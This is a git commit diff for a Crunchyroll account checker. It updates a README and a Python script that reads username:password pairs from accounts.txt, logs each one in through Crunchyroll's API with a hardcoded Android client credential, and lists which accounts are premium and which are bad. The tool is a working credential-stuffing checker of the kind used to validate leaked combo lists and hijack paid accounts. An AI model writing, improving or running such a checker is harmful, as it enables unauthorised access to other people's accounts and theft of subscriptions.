0c0175810ec3b766c0376320d783a73af0089c40
ZECHS <vijay.vky2002@gmail.com>
2021-06-01 21:55:41 +0530

    Updated output, shows list of Premium and Bad accounts.

--- README.md
+++ README.md
@@ -1,10 +1,13 @@
 # CrunchyrollAccountChecker
 
-Add accounts in `accounts.txt` text file format should be 
+A simple script to filter out premium crunchyroll accounts
+##Usages
+Make a text file called `accounts.txt` in same director where you have cloned this repo, make sure it has accounts in this pattern then simply double click or run the main.py file using python.
 
 ```
 username:passwd
 username:passwd
 username:passwd
 ```
-it will check if accounts are preminum or not
+
+it will check if accounts are premium or not
--- main.py
+++ main.py
@@ -1,89 +1,78 @@
-import requests, os
+import os
 
+import requests
 
 
 def test_account(email, password):
-    global nonpremiumCount
-    nonpremiumCount = 0
-    user_login = requests.post(
-        'https://beta-api.crunchyroll.com/auth/v1/token',
-        {
-            'username': email,
-            'password': password,
-            'grant_type': 'password',
-            'scope': 'offline_access'
-        },
-        headers={'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1'},
-        auth=('cr_android', '1cf35dc5-b286-4551-8835-d4b1b4258445')
-    )
+    user_login = requests.post('https://beta-api.crunchyroll.com/auth/v1/token',
+                               {
+                                   'username': email,
+                                   'password': password,
+                                   'grant_type': 'password',
+                                   'scope': 'offline_access'
+                               },
+                               headers={
+                                   'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1'},
+                               auth=('cr_android', '1cf35dc5-b286-4551-8835-d4b1b4258445'))
 
     if user_login.status_code != 200:
-        print(f'Account {email}:{password} - Invalid email or password')
         return False
 
     user_login = user_login.json()
 
     access_token = user_login.get('access_token')
 
-    user_profile = requests.get(
-        'https://beta-api.crunchyroll.com/accounts/v1/me',
-        headers={
-            'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1',
-            'Authorization': 'Bearer ' + access_token
-        }
-    )
+    user_profile = requests.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers={
+        'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1',
+        'Authorization': 'Bearer ' + access_token})
 
     if user_profile.status_code != 200:
-        print(f'Account {email}:{password} cannot get id')
         return False
 
     user_profile = user_profile.json()
 
     external_id = user_profile.get('external_id')
 
-    benefits = requests.get(
-        f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits',
-        headers={
-            'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1',
-            'Authorization': 'Bearer ' + access_token
-        }
-    )
+    benefits = requests.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits',
+                            headers={
+                                'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1',
+                                'Authorization': 'Bearer ' + access_token
+                            })
 
     if benefits.status_code != 200 and benefits.json().get('code') == 'subscription.not_found':
-        print(f'Account {email}:{password} - not premium')
-        nonpremiumCount = nonpremiumCount + 1
-        nonPremiumFile = open('nonPremiumHits.txt', 'a')
-        nonPremiumFile.write(f'{email}:{password}\n')
-        nonPremiumFile.close()
         return False
 
     benefits = benefits.json()
 
     if benefits.get('items')[0]['benefit'] == 'cr_premium':
         return True
+
     return False
 
 
 acc_file = open('accounts.txt', 'r', encoding="utf-8")
-
-
-global premiumCount
-
-
+success_accounts = []
+fail_accounts = []
 
 if os.path.getsize('accounts.txt') > 0:
-    premiumCount = 0
     for line in acc_file.readlines():
         account_list = line.split(':')
         eml = account_list[0].strip()
         pwd = account_list[1].strip()
         if test_account(eml, pwd):
-            print(f'Account {eml}:{pwd} - Premium account')
-            premiumCount = premiumCount + 1
-            premiumFile = open('PremiumHits.txt', 'a')
-            premiumFile.write(f'{eml}:{pwd}\n')
-            premiumFile.close()
+            success_accounts.append(f"{eml}:{pwd}")
+        else:
+            fail_accounts.append(f"{eml}:{pwd}")
+
+    if len(success_accounts):
+        print(f"Premium Accounts ({len(success_accounts)}):\n")
+        print('\n'.join(map(str, success_accounts)))
+
+    if len(fail_accounts):
+        print(f"Bad Accounts ({len(fail_accounts)}):\n")
+        print('\n'.join(map(str, fail_accounts)))
 else:
     print("No accounts found, please add some accounts in accounts.txt file.")
+
 acc_file.close()
-print(f"\nScript finished with {premiumCount} premiums and {nonpremiumCount} non premiums")
+input("\nPress any key to exit")
